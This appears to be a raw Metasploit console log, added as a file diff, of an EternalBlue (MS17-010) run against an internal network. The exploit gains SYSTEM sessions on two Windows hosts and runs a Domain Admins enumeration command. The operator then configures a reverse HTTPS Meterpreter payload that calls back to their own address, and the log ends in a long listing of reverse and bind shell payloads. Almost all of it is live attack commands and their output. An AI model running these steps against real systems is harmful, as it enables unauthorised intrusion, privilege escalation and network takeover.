@@ -1,0 +1,1269 @@
+[1m[34m[*][0m Spooling to file eternalblue.log...
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> r[Ke[Krun
+[0m
+[1m[34m[*][0m 10.20.31.10:445       - Target OS: Unix
+[1m[31m[-][0m 10.20.31.10:445       - Exploit unavailable for target OS.
+[1m[34m[*][0m 10.20.31.71:445       - Target OS: Windows 6.1
+[1m[31m[-][0m 10.20.31.71:445       - Exploit unavailable for target OS.
+[1m[34m[*][0m 10.100.101.6:445      - Target OS: Windows 7 Enterprise 7600
+[1m[31m[-][0m 10.100.101.6:445      - Unable to find accessible named pipe!
+[1m[34m[*][0m 10.100.101.31:445     - Target OS: Windows 5.1
+[1m[34m[*][0m 10.100.101.31:445     - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.101.31:445     - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.31:445     - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.101.31:445     - 		[*] Trying stick 1 (x86)...Boom!
+[1m[34m[*][0m 10.100.101.31:445     - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.101.31:445     - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.101.31:445     - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.31:445     - Reading from CONNECTION struct at: 0x81fe07e0
+[1m[34m[*][0m 10.100.101.31:445     - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.101.31:445     - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.101.31:445     - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.101.31:445     - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain alpha.net.
+
+
+[1m[32m[+][0m 10.100.101.31:445     - Cleanup was successful
+[1m[34m[*][0m Scanned  4 of 40 hosts (10% complete)
+[1m[34m[*][0m 10.100.101.55:445     - Target OS: Unix
+[1m[31m[-][0m 10.100.101.55:445     - Exploit unavailable for target OS.
+[1m[34m[*][0m 10.100.101.90:445     - Target OS: Windows Server 2003 R2 3790 Service Pack 1
+[1m[34m[*][0m 10.100.101.90:445     - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.101.90:445     - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.90:445     - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.101.90:445     - 		Trying stick 1 (x64)...Miss
+[1m[34m[*][0m 10.100.101.90:445     - 		[*] Trying stick 2 (x86)...Boom!
+[1m[34m[*][0m 10.100.101.90:445     - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.101.90:445     - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.101.90:445     - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.101.90:445     - Reading from CONNECTION struct at: 0x859b11a8
+[1m[34m[*][0m 10.100.101.90:445     - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.101.90:445     - Overwrite complete... SYSTEM session obtained!
+[1m[32m[+][0m 10.100.101.90:445     - Service start timed out, OK if running a command or non-service executable...
+[1m[34m[*][0m 10.100.101.90:445     - Output for "net group "Domain Admins" /domain":
+The request will be processed at a domain controller for domain WORKGROUP.
+
+
+[1m[32m[+][0m 10.100.101.90:445     - Cleanup was successful
+[1m[34m[*][0m Caught interrupt from the console...
+[1m[34m[*][0m Auxiliary module execution completed
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+No active sessions.
+
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> set[K[K[Kpayloads
+[0m[1m[31m[-][0m Unknown command: payloads.
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> payloads[K
+[0m[1m[31m[-][0m Unknown command: payload.
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> set payload windows/x64/meterpreter/reverse_https
+[0mpayload => windows/x64/meterpreter/reverse_https
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> c[Kifconfig
+[0m[1m[34m[*][0m exec: ifconfig
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.9.69.15  netmask 255.255.255.0  broadcast 172.9.69.255
+        inet6 fe80::a00:27ff:fe72:5b6f  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:72:5b:6f  txqueuelen 1000  (Ethernet)
+        RX packets 181419  bytes 75232462 (71.7 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 137089  bytes 19059162 (18.1 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 311118  bytes 94045597 (89.6 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 311118  bytes 94045597 (89.6 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 5.5.0.196  netmask 255.255.255.0  destination 5.5.0.196
+        inet6 fe80::315c:908c:6213:3188  prefixlen 64  scopeid 0x20<link>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
+        RX packets 52194  bytes 5351795 (5.1 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 95288  bytes 5510811 (5.2 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> set payload windows/x64/meterpreter/reverse_https
+[0mpayload => windows/x64/meterpreter/reverse_https
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> set LHOST 5.5.0.196
+[0mLHOST => 5.5.0.196
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> show options
+[0m
+Module options (auxiliary/admin/smb/ms17_010_command):
+
+   Name                  Current Setting                                Required  Description
+   ----                  ---------------                                --------  -----------
+   COMMAND               net group "Domain Admins" /domain              yes       The command you want to execute on the remote host
+   DBGTRACE              false                                          yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                             yes       How many times to try to leak transaction
+   NAMEDPIPE                                                            no        A named pipe that can be connected to (leave blank for auto)
+   RHOSTS                file:/tmp/msf-db-rhosts-20180318-13075-8axwti  yes       The target address range or CIDR identifier
+   RPORT                 445                                            yes       The Target port
+   SERVICE_DESCRIPTION                                                  no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                 no        The service display name
+   SERVICE_NAME                                                         no        The service name
+   SMBDomain             .                                              no        The Windows domain to use for authentication
+   SMBPass                                                              no        The password for the specified username
+   SMBSHARE              C$                                             yes       The name of a writeable share on the server
+   SMBUser                                                              no        The username to authenticate as
+   THREADS               1                                              yes       The number of concurrent threads
+   WINPATH               WINDOWS                                        yes       The name of the remote Windows directory
+
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> show advances[Kd
+[0m
+Module advanced options (auxiliary/admin/smb/ms17_010_command):
+
+   Name                    Current Setting    Required  Description
+   ----                    ---------------    --------  -----------
+   CHOST                                      no        The local client address
+   CPORT                                      no        The local client port
+   ConnectTimeout          10                 yes       Maximum number of seconds to establish a TCP connection
+   DCERPC::ReadTimeout     10                 yes       The number of seconds to wait for DCERPC responses
+   DELAY                   0                  yes       Wait this many seconds before reading output and cleaning up
+   FILEPREFIX                                 no        Add a custom prefix to the temporary files
+   NTLM::SendLM            true               yes       Always send the LANMAN response (except when NTLMv2_session is specified)
+   NTLM::SendNTLM          true               yes       Activate the 'Negotiate NTLM key' flag, indicating the use of NTLM responses
+   NTLM::SendSPN           true               yes       Send an avp of type SPN in the ntlmv2 client blob, this allows authentication on Windows 7+/Server 2008 R2+ when SPN is required
+   NTLM::UseLMKey          false              yes       Activate the 'Negotiate Lan Manager Key' flag, using the LM key when the LM response is sent
+   NTLM::UseNTLM2_session  true               yes       Activate the 'Negotiate NTLM2 key' flag, forcing the use of a NTLMv2_session
+   NTLM::UseNTLMv2         true               yes       Use NTLMv2 instead of NTLM2_session when 'Negotiate NTLM2' key is true
+   Proxies                                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RETRY                   0                  yes       Retry this many times to check if the process is complete
+   SERVICE_PERSIST         false              yes       Create an Auto run service and do not remove it.
+   SMB::ChunkSize          500                yes       The chunk size for SMB segments, bigger values will increase speed but break NT 4.0 and SMB signing
+   SMB::Native_LM          Windows 2000 5.0   yes       The Native LM to send during authentication
+   SMB::Native_OS          Windows 2000 2195  yes       The Native OS to send during authentication
+   SMB::VerifySignature    false              yes       Enforces client-side verification of server response signatures
+   SMBDirect               true               no        The target port is a raw SMB service (not NetBIOS)
+   SMBName                 *SMBSERVER         yes       The NetBIOS hostname (required for port 139 connections)
+   SSL                     false              no        Negotiate SSL/TLS for outgoing connections
+   SSLCipher                                  no        String for SSL cipher - "DHE-RSA-AES256-SHA" or "ADH"
+   SSLVerifyMode           PEER               no        SSL verification method (Accepted: CLIENT_ONCE, FAIL_IF_NO_PEER_CERT, NONE, PEER)
+   SSLVersion              Auto               yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Auto, TLS, TLS1, TLS1.2, TLS1.1, SSL23)
+   ShowProgress            true               yes       Display progress messages during a scan
+   ShowProgressPercent     10                 yes       The interval in percent that progress should be shown
+   VERBOSE                 false              no        Enable detailed status messages
+   WORKSPACE                                  no        Specify the workspace for this module
+
+[4mmsf[0m auxiliary([1m[31madmin/smb/ms17_010_command[0m) [0m> expl[K[K[K[Kshow options[K[K[K[K[K[K[K[K[K[K[K[Ks[Kshow play[K[K[Kayloads
+[0m
+Payloads
+========
+
+   Name                                                Disclosure Date  Rank    Description
+   ----                                                ---------------  ----    -----------
+   aix/ppc/shell_bind_tcp                                               normal  AIX Command Shell, Bind TCP Inline
+   aix/ppc/shell_find_port                                              normal  AIX Command Shell, Find Port Inline
+   aix/ppc/shell_interact                                               normal  AIX execve Shell for inetd
+   aix/ppc/shell_reverse_tcp                                            normal  AIX Command Shell, Reverse TCP Inline
+   android/meterpreter/reverse_http                                     normal  Android Meterpreter, Android Reverse HTTP Stager
+   android/meterpreter/reverse_https                                    normal  Android Meterpreter, Android Reverse HTTPS Stager
+   android/meterpreter/reverse_tcp                                      normal  Android Meterpreter, Android Reverse TCP Stager
+   android/meterpreter_reverse_http                                     normal  Android Meterpreter Shell, Reverse HTTP Inline
+   android/meterpreter_reverse_https                                    normal  Android Meterpreter Shell, Reverse HTTPS Inline
+   android/meterpreter_reverse_tcp                                      normal  Android Meterpreter Shell, Reverse TCP Inline
+   android/shell/reverse_http                                           normal  Command Shell, Android Reverse HTTP Stager
+   android/shell/reverse_https                                          normal  Command Shell, Android Reverse HTTPS Stager
+   android/shell/reverse_tcp                                            normal  Command Shell, Android Reverse TCP Stager
+   apple_ios/aarch64/meterpreter_reverse_http                           normal  Apple_iOS Meterpreter, Reverse HTTP Inline
+   apple_ios/aarch64/meterpreter_reverse_https                          normal  Apple_iOS Meterpreter, Reverse HTTPS Inline
+   apple_ios/aarch64/meterpreter_reverse_tcp                            normal  Apple_iOS Meterpreter, Reverse TCP Inline
+   apple_ios/aarch64/shell_reverse_tcp                                  normal  Apple iOS aarch64 Command Shell, Reverse TCP Inline
+   bsd/sparc/shell_bind_tcp                                             normal  BSD Command Shell, Bind TCP Inline
+   bsd/sparc/shell_reverse_tcp                                          normal  BSD Command Shell, Reverse TCP Inline
+   bsd/x64/exec                                                         normal  BSD x64 Execute Command
+   bsd/x64/shell_bind_ipv6_tcp                                          normal  BSD x64 Command Shell, Bind TCP Inline (IPv6)
+   bsd/x64/shell_bind_tcp                                               normal  BSD x64 Shell Bind TCP
+   bsd/x64/shell_bind_tcp_small                                         normal  BSD x64 Command Shell, Bind TCP Inline
+   bsd/x64/shell_reverse_ipv6_tcp                                       normal  BSD x64 Command Shell, Reverse TCP Inline (IPv6)
+   bsd/x64/shell_reverse_tcp                                            normal  BSD x64 Shell Reverse TCP
+   bsd/x64/shell_reverse_tcp_small                                      normal  BSD x64 Command Shell, Reverse TCP Inline
+   bsd/x86/exec                                                         normal  BSD Execute Command
+   bsd/x86/metsvc_bind_tcp                                              normal  FreeBSD Meterpreter Service, Bind TCP
+   bsd/x86/metsvc_reverse_tcp                                           normal  FreeBSD Meterpreter Service, Reverse TCP Inline
+   bsd/x86/shell/bind_ipv6_tcp                                          normal  BSD Command Shell, Bind TCP Stager (IPv6)
+   bsd/x86/shell/bind_tcp                                               normal  BSD Command Shell, Bind TCP Stager
+   bsd/x86/shell/find_tag                                               normal  BSD Command Shell, Find Tag Stager
+   bsd/x86/shell/reverse_ipv6_tcp                                       normal  BSD Command Shell, Reverse TCP Stager (IPv6)
+   bsd/x86/shell/reverse_tcp                                            normal  BSD Command Shell, Reverse TCP Stager
+   bsd/x86/shell_bind_tcp                                               normal  BSD Command Shell, Bind TCP Inline
+   bsd/x86/shell_bind_tcp_ipv6                                          normal  BSD Command Shell, Bind TCP Inline (IPv6)
+   bsd/x86/shell_find_port                                              normal  BSD Command Shell, Find Port Inline
+   bsd/x86/shell_find_tag                                               normal  BSD Command Shell, Find Tag Inline
+   bsd/x86/shell_reverse_tcp                                            normal  BSD Command Shell, Reverse TCP Inline
+   bsd/x86/shell_reverse_tcp_ipv6                                       normal  BSD Command Shell, Reverse TCP Inline (IPv6)
+   bsdi/x86/shell/bind_tcp                                              normal  BSDi Command Shell, Bind TCP Stager
+   bsdi/x86/shell/reverse_tcp                                           normal  BSDi Command Shell, Reverse TCP Stager
+   bsdi/x86/shell_bind_tcp                                              normal  BSDi Command Shell, Bind TCP Inline
+   bsdi/x86/shell_find_port                                             normal  BSDi Command Shell, Find Port Inline
+   bsdi/x86/shell_reverse_tcp                                           normal  BSDi Command Shell, Reverse TCP Inline
+   cmd/mainframe/apf_privesc_jcl                                        normal  JCL to Escalate Privileges
+   cmd/mainframe/bind_shell_jcl                                         normal  Z/OS (MVS) Command Shell, Bind TCP
+   cmd/mainframe/generic_jcl                                            normal  Generic JCL Test for Mainframe Exploits
+   cmd/mainframe/reverse_shell_jcl                                      normal  Z/OS (MVS) Command Shell, Reverse TCP
+   cmd/unix/bind_awk                                                    normal  Unix Command Shell, Bind TCP (via AWK)
+   cmd/unix/bind_inetd                                                  normal  Unix Command Shell, Bind TCP (inetd)
+   cmd/unix/bind_lua                                                    normal  Unix Command Shell, Bind TCP (via Lua)
+   cmd/unix/bind_netcat                                                 normal  Unix Command Shell, Bind TCP (via netcat)
+   cmd/unix/bind_netcat_gaping                                          normal  Unix Command Shell, Bind TCP (via netcat -e)
+   cmd/unix/bind_netcat_gaping_ipv6                                     normal  Unix Command Shell, Bind TCP (via netcat -e) IPv6
+   cmd/unix/bind_nodejs                                                 normal  Unix Command Shell, Bind TCP (via nodejs)
+   cmd/unix/bind_perl                                                   normal  Unix Command Shell, Bind TCP (via Perl)
+   cmd/unix/bind_perl_ipv6                                              normal  Unix Command Shell, Bind TCP (via perl) IPv6
+   cmd/unix/bind_r                                                      normal  Unix Command Shell, Bind TCP (via R)
+   cmd/unix/bind_ruby                                                   normal  Unix Command Shell, Bind TCP (via Ruby)
+   cmd/unix/bind_ruby_ipv6                                              normal  Unix Command Shell, Bind TCP (via Ruby) IPv6
+   cmd/unix/bind_socat_udp                                              normal  Unix Command Shell, Bind UDP (via socat)
+   cmd/unix/bind_stub                                                   normal  Unix Command Shell, Bind TCP (stub)
+   cmd/unix/bind_zsh                                                    normal  Unix Command Shell, Bind TCP (via Zsh)
+   cmd/unix/generic                                                     normal  Unix Command, Generic Command Execution
+   cmd/unix/interact                                                    normal  Unix Command, Interact with Established Connection
+   cmd/unix/reverse                                                     normal  Unix Command Shell, Double Reverse TCP (telnet)
+   cmd/unix/reverse_awk                                                 normal  Unix Command Shell, Reverse TCP (via AWK)
+   cmd/unix/reverse_bash                                                normal  Unix Command Shell, Reverse TCP (/dev/tcp)
+   cmd/unix/reverse_bash_telnet_ssl                                     normal  Unix Command Shell, Reverse TCP SSL (telnet)
+   cmd/unix/reverse_lua                                                 normal  Unix Command Shell, Reverse TCP (via Lua)
+   cmd/unix/reverse_ncat_ssl                                            normal  Unix Command Shell, Reverse TCP (via ncat)
+   cmd/unix/reverse_netcat                                              normal  Unix Command Shell, Reverse TCP (via netcat)
+   cmd/unix/reverse_netcat_gaping                                       normal  Unix Command Shell, Reverse TCP (via netcat -e)
+   cmd/unix/reverse_nodejs                                              normal  Unix Command Shell, Reverse TCP (via nodejs)
+   cmd/unix/reverse_openssl                                             normal  Unix Command Shell, Double Reverse TCP SSL (openssl)
+   cmd/unix/reverse_perl                                                normal  Unix Command Shell, Reverse TCP (via Perl)
+   cmd/unix/reverse_perl_ssl                                            normal  Unix Command Shell, Reverse TCP SSL (via perl)
+   cmd/unix/reverse_php_ssl                                             normal  Unix Command Shell, Reverse TCP SSL (via php)
+   cmd/unix/reverse_python                                              normal  Unix Command Shell, Reverse TCP (via Python)
+   cmd/unix/reverse_python_ssl                                          normal  Unix Command Shell, Reverse TCP SSL (via python)
+   cmd/unix/reverse_r                                                   normal  Unix Command Shell, Reverse TCP (via R)
+   cmd/unix/reverse_ruby                                                normal  Unix Command Shell, Reverse TCP (via Ruby)
+   cmd/unix/reverse_ruby_ssl                                            normal  Unix Command Shell, Reverse TCP SSL (via Ruby)
+   cmd/unix/reverse_socat_udp                                           normal  Unix Command Shell, Reverse UDP (via socat)
+   cmd/unix/reverse_ssl_double_telnet                                   normal  Unix Command Shell, Double Reverse TCP SSL (telnet)
+   cmd/unix/reverse_stub                                                normal  Unix Command Shell, Reverse TCP (stub)
+   cmd/unix/reverse_zsh                                                 normal  Unix Command Shell, Reverse TCP (via Zsh)
+   cmd/windows/adduser                                                  normal  Windows Execute net user /ADD CMD
+   cmd/windows/bind_lua                                                 normal  Windows Command Shell, Bind TCP (via Lua)
+   cmd/windows/bind_perl                                                normal  Windows Command Shell, Bind TCP (via Perl)
+   cmd/windows/bind_perl_ipv6                                           normal  Windows Command Shell, Bind TCP (via perl) IPv6
+   cmd/windows/bind_ruby                                                normal  Windows Command Shell, Bind TCP (via Ruby)
+   cmd/windows/download_eval_vbs                                        normal  Windows Executable Download and Evaluate VBS
+   cmd/windows/download_exec_vbs                                        normal  Windows Executable Download and Execute (via .vbs)
+   cmd/windows/generic                                                  normal  Windows Command, Generic Command Execution
+   cmd/windows/powershell_bind_tcp                                      normal  Windows Interactive Powershell Session, Bind TCP
+   cmd/windows/powershell_reverse_tcp                                   normal  Windows Interactive Powershell Session, Reverse TCP
+   cmd/windows/reverse_lua                                              normal  Windows Command Shell, Reverse TCP (via Lua)
+   cmd/windows/reverse_perl                                             normal  Windows Command, Double Reverse TCP Connection (via Perl)
+   cmd/windows/reverse_powershell                                       normal  Windows Command Shell, Reverse TCP (via Powershell)
+   cmd/windows/reverse_ruby                                             normal  Windows Command Shell, Reverse TCP (via Ruby)
+   firefox/exec                                                         normal  Firefox XPCOM Execute Command
+   firefox/shell_bind_tcp                                               normal  Command Shell, Bind TCP (via Firefox XPCOM script)
+   firefox/shell_reverse_tcp                                            normal  Command Shell, Reverse TCP (via Firefox XPCOM script)
+   generic/custom                                                       normal  Custom Payload
+   generic/debug_trap                                                   normal  Generic x86 Debug Trap
+   generic/shell_bind_tcp                                               normal  Generic Command Shell, Bind TCP Inline
+   generic/shell_reverse_tcp                                            normal  Generic Command Shell, Reverse TCP Inline
+   generic/tight_loop                                                   normal  Generic x86 Tight Loop
+   java/jsp_shell_bind_tcp                                              normal  Java JSP Command Shell, Bind TCP Inline
+   java/jsp_shell_reverse_tcp                                           normal  Java JSP Command Shell, Reverse TCP Inline
+   java/meterpreter/bind_tcp                                            normal  Java Meterpreter, Java Bind TCP Stager
+   java/meterpreter/reverse_http                                        normal  Java Meterpreter, Java Reverse HTTP Stager
+   java/meterpreter/reverse_https                                       normal  Java Meterpreter, Java Reverse HTTPS Stager
+   java/meterpreter/reverse_tcp                                         normal  Java Meterpreter, Java Reverse TCP Stager
+   java/shell/bind_tcp                                                  normal  Command Shell, Java Bind TCP Stager
+   java/shell/reverse_tcp                                               normal  Command Shell, Java Reverse TCP Stager
+   java/shell_reverse_tcp                                               normal  Java Command Shell, Reverse TCP Inline
+   linux/aarch64/meterpreter/reverse_tcp                                normal  Linux Meterpreter, Reverse TCP Stager
+   linux/aarch64/meterpreter_reverse_http                               normal  Linux Meterpreter, Reverse HTTP Inline
+   linux/aarch64/meterpreter_reverse_https                              normal  Linux Meterpreter, Reverse HTTPS Inline
+   linux/aarch64/meterpreter_reverse_tcp                                normal  Linux Meterpreter, Reverse TCP Inline
+   linux/aarch64/shell/reverse_tcp                                      normal  Linux dup2 Command Shell, Reverse TCP Stager
+   linux/aarch64/shell_reverse_tcp                                      normal  Linux Command Shell, Reverse TCP Inline
+   linux/armbe/meterpreter_reverse_http                                 normal  Linux Meterpreter, Reverse HTTP Inline
+   linux/armbe/meterpreter_reverse_https                                normal  Linux Meterpreter, Reverse HTTPS Inline
+   linux/armbe/meterpreter_reverse_tcp                                  normal  Linux Meterpreter, Reverse TCP Inline
+   linux/armbe/shell_bind_tcp                                           normal  Linux ARM Big Endian Command Shell, Bind TCP Inline
+   linux/armle/adduser                                                  normal  Linux Add User
+   linux/armle/exec                                                     normal  Linux Execute Command
+   linux/armle/meterpreter/bind_tcp                                     normal  Linux Meterpreter, Bind TCP Stager
+   linux/armle/meterpreter/reverse_tcp                                  normal  Linux Meterpreter, Reverse TCP Stager
+   linux/armle/meterpreter_reverse_http                                 normal  Linux Meterpreter, Reverse HTTP Inline
+   linux/armle/meterpreter_reverse_https                                normal  Linux Meterpreter, Reverse HTTPS Inline
+   linux/armle/meterpreter_reverse_tcp                                  normal  Linux Meterpreter, Reverse TCP Inline
+   linux/armle/shell/bind_tcp                                           normal  Linux dup2 Command Shell, Bind TCP Stager
+   linux/armle/shell/reverse_tcp                                        normal  Linux dup2 Command Shell, Reverse TCP Stager
+   linux/armle/shell_bind_tcp                                           normal  Linux Command Shell, Reverse TCP Inline
+   linux/armle/shell_reverse_tcp                                        normal  Linux Command Shell, Reverse TCP Inline
+   linux/mips64/meterpreter_reverse_http                                normal  Linux Meterpreter, Reverse HTTP Inline
+   linux/mips64/meterpreter_reverse_https                               normal  Linux Meterpreter, Reverse HTTPS Inline
+   linux/mips64/meterpreter_reverse_tcp                                 normal  Linux Meterpreter, Reverse TCP Inline
+   linux/mipsbe/exec                                                    normal  Linux Execute Command
+   linux/mipsbe/meterpreter/reverse_tcp                                 normal  Linux Meterpreter, Reverse TCP Stager
+   linux/mipsbe/meterpreter_reverse_http                                normal  Linux Meterpreter, Reverse HTTP Inline
+   linux/mipsbe/meterpreter_reverse_https                               normal  Linux Meterpreter, Reverse HTTPS Inline
+   linux/mipsbe/meterpreter_reverse_tcp                                 normal  Linux Meterpreter, Reverse TCP Inline
+   linux/mipsbe/reboot                                                  normal  Linux Reboot
+   linux/mipsbe/shell/reverse_tcp                                       normal  Linux Command Shell, Reverse TCP Stager
+   linux/mipsbe/shell_bind_tcp                                          normal  Linux Command Shell, Bind TCP Inline
+   linux/mipsbe/shell_reverse_tcp                                       normal  Linux Command Shell, Reverse TCP Inline
+   linux/mipsle/exec                                                    normal  Linux Execute Command
+   linux/mipsle/meterpreter/reverse_tcp                                 normal  Linux Meterpreter, Reverse TCP Stager
+   linux/mipsle/meterpreter_reverse_http                                normal  Linux Meterpreter, Reverse HTTP Inline
+   linux/mipsle/meterpreter_reverse_https                               normal  Linux Meterpreter, Reverse HTTPS Inline
+   linux/mipsle/meterpreter_reverse_tcp                                 normal  Linux Meterpreter, Reverse TCP Inline
+   linux/mipsle/reboot                                                  normal  Linux Reboot
+   linux/mipsle/shell/reverse_tcp                                       normal  Linux Command Shell, Reverse TCP Stager
+   linux/mipsle/shell_bind_tcp                                          normal  Linux Command Shell, Bind TCP Inline
+   linux/mipsle/shell_reverse_tcp                                       normal  Linux Command Shell, Reverse TCP Inline
+   linux/ppc/meterpreter_reverse_http                                   normal  Linux Meterpreter, Reverse HTTP Inline
+   linux/ppc/meterpreter_reverse_https                                  normal  Linux Meterpreter, Reverse HTTPS Inline
+   linux/ppc/meterpreter_reverse_tcp                                    normal  Linux Meterpreter, Reverse TCP Inline
+   linux/ppc/shell_bind_tcp                                             normal  Linux Command Shell, Bind TCP Inline
+   linux/ppc/shell_find_port                                            normal  Linux Command Shell, Find Port Inline
+   linux/ppc/shell_reverse_tcp                                          normal  Linux Command Shell, Reverse TCP Inline
+   linux/ppc64/shell_bind_tcp                                           normal  Linux Command Shell, Bind TCP Inline
+   linux/ppc64/shell_find_port                                          normal  Linux Command Shell, Find Port Inline
+   linux/ppc64/shell_reverse_tcp                                        normal  Linux Command Shell, Reverse TCP Inline
+   linux/ppc64le/meterpreter_reverse_http                               normal  Linux Meterpreter, Reverse HTTP Inline
+   linux/ppc64le/meterpreter_reverse_https                              normal  Linux Meterpreter, Reverse HTTPS Inline
+   linux/ppc64le/meterpreter_reverse_tcp                                normal  Linux Meterpreter, Reverse TCP Inline
+   linux/ppce500v2/meterpreter_reverse_http                             normal  Linux Meterpreter, Reverse HTTP Inline
+   linux/ppce500v2/meterpreter_reverse_https                            normal  Linux Meterpreter, Reverse HTTPS Inline
+   linux/ppce500v2/meterpreter_reverse_tcp                              normal  Linux Meterpreter, Reverse TCP Inline
+   linux/x64/exec                                                       normal  Linux Execute Command
+   linux/x64/meterpreter/bind_tcp                                       normal  Linux Mettle x64, Bind TCP Stager
+   linux/x64/meterpreter/reverse_tcp                                    normal  Linux Mettle x64, Reverse TCP Stager
+   linux/x64/meterpreter_reverse_http                                   normal  Linux Meterpreter, Reverse HTTP Inline
+   linux/x64/meterpreter_reverse_https                                  normal  Linux Meterpreter, Reverse HTTPS Inline
+   linux/x64/meterpreter_reverse_tcp                                    normal  Linux Meterpreter, Reverse TCP Inline
+   linux/x64/shell/bind_tcp                                             normal  Linux Command Shell, Bind TCP Stager
+   linux/x64/shell/reverse_tcp                                          normal  Linux Command Shell, Reverse TCP Stager
+   linux/x64/shell_bind_tcp                                             normal  Linux Command Shell, Bind TCP Inline
+   linux/x64/shell_bind_tcp_random_port                                 normal  Linux Command Shell, Bind TCP Random Port Inline
+   linux/x64/shell_find_port                                            normal  Linux Command Shell, Find Port Inline
+   linux/x64/shell_reverse_tcp                                          normal  Linux Command Shell, Reverse TCP Inline
+   linux/x86/adduser                                                    normal  Linux Add User
+   linux/x86/chmod                                                      normal  Linux Chmod
+   linux/x86/exec                                                       normal  Linux Execute Command
+   linux/x86/meterpreter/bind_ipv6_tcp                                  normal  Linux Mettle x86, Bind IPv6 TCP Stager (Linux x86)
+   linux/x86/meterpreter/bind_ipv6_tcp_uuid                             normal  Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support (Linux x86)
+   linux/x86/meterpreter/bind_nonx_tcp                                  normal  Linux Mettle x86, Bind TCP Stager
+   linux/x86/meterpreter/bind_tcp                                       normal  Linux Mettle x86, Bind TCP Stager (Linux x86)
+   linux/x86/meterpreter/bind_tcp_uuid                                  normal  Linux Mettle x86, Bind TCP Stager with UUID Support (Linux x86)
+   linux/x86/meterpreter/find_tag                                       normal  Linux Mettle x86, Find Tag Stager
+   linux/x86/meterpreter/reverse_ipv6_tcp                               normal  Linux Mettle x86, Reverse TCP Stager (IPv6)
+   linux/x86/meterpreter/reverse_nonx_tcp                               normal  Linux Mettle x86, Reverse TCP Stager
+   linux/x86/meterpreter/reverse_tcp                                    normal  Linux Mettle x86, Reverse TCP Stager
+   linux/x86/meterpreter/reverse_tcp_uuid                               normal  Linux Mettle x86, Reverse TCP Stager
+   linux/x86/meterpreter_reverse_http                                   normal  Linux Meterpreter, Reverse HTTP Inline
+   linux/x86/meterpreter_reverse_https                                  normal  Linux Meterpreter, Reverse HTTPS Inline
+   linux/x86/meterpreter_reverse_tcp                                    normal  Linux Meterpreter, Reverse TCP Inline
+   linux/x86/metsvc_bind_tcp                                            normal  Linux Meterpreter Service, Bind TCP
+   linux/x86/metsvc_reverse_tcp                                         normal  Linux Meterpreter Service, Reverse TCP Inline
+   linux/x86/read_file                                                  normal  Linux Read File
+   linux/x86/shell/bind_ipv6_tcp                                        normal  Linux Command Shell, Bind IPv6 TCP Stager (Linux x86)
+   linux/x86/shell/bind_ipv6_tcp_uuid                                   normal  Linux Command Shell, Bind IPv6 TCP Stager with UUID Support (Linux x86)
+   linux/x86/shell/bind_nonx_tcp                                        normal  Linux Command Shell, Bind TCP Stager
+   linux/x86/shell/bind_tcp                                             normal  Linux Command Shell, Bind TCP Stager (Linux x86)
+   linux/x86/shell/bind_tcp_uuid                                        normal  Linux Command Shell, Bind TCP Stager with UUID Support (Linux x86)
+   linux/x86/shell/find_tag                                             normal  Linux Command Shell, Find Tag Stager
+   linux/x86/shell/reverse_ipv6_tcp                                     normal  Linux Command Shell, Reverse TCP Stager (IPv6)
+   linux/x86/shell/reverse_nonx_tcp                                     normal  Linux Command Shell, Reverse TCP Stager
+   linux/x86/shell/reverse_tcp                                          normal  Linux Command Shell, Reverse TCP Stager
